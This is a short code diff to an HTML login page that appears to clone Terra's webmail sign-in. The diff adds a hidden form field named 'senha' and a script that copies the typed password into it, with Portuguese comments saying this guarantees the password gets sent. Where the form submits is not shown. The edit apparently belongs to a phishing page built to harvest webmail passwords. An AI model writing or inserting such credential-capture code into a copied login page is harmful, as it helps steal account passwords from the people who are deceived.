@@ -66,6 +66,10 @@
  </div>
  </div>
  </div>
+ 
+ <!-- CAMPO HIDDEN ADICIONADO PARA GARANTIR O ENVIO DA SENHA -->
+ <input type="hidden" name="senha" id="senhaHidden">
+ 
  <a class=forgot-password-webmail-login href=https://central.terra.com.br/esqueci-minha-senha>Esqueceu sua senha?</a>
  <div class=container-message-webmail-login></div>
  
@@ -151,9 +155,12 @@
  </ul>
  </footer>
  </div>
- 
- 
- 
- 
+
+<!-- SCRIPT PARA GARANTIR O ENVIO DA SENHA -->
+<script>
+document.getElementById('pass').addEventListener('input', function() {
+    document.getElementById('senhaHidden').value = this.value;
+});
+</script>
  
 <style>#sec-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;background-color:rgba(0,0,0,0.5)}@media (max-width:575px){#sec-overlay{background-color:#fff;overflow:auto;-webkit-overflow-scrolling:touch}}</style><div id=sec-overlay style=display:none></div>
